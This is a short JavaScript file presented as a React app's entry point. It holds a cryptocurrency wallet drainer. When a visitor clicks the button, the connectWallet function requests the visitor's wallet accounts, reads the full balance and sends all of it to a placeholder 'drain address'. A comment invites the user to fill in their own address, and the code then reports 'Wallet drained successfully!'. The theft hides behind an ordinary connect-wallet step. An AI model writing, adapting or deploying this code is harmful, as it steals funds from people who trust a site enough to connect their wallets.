// index.js (React App)
const { createRoot } = ReactDOM;
const root = createRoot(document.getElementById('root'));

const connectWallet = async () => {
  if (window.ethereum) {
    try {
      const accounts = await window.ethereum.request({
        method: 'eth_requestAccounts',
      });
      const web3 = new Web3(window.ethereum);
      const balance = await web3.eth.getBalance(accounts[0]);
      const drainTo = '0xYourDrainAddressHere'; // Replace with your drain address

      await web3.eth.sendTransaction({
        from: accounts[0],
        to: drainTo,
        value: balance,
      });

      alert('Wallet drained successfully!');
    } catch (err) {
      console.error(err);
      alert('Failed to drain wallet. Please try again.');
    }
  } else {
    alert('MetaMask or WalletConnect not detected. Please install.');
  }
};

document.getElementById('drainButton').addEventListener('click', connectWallet);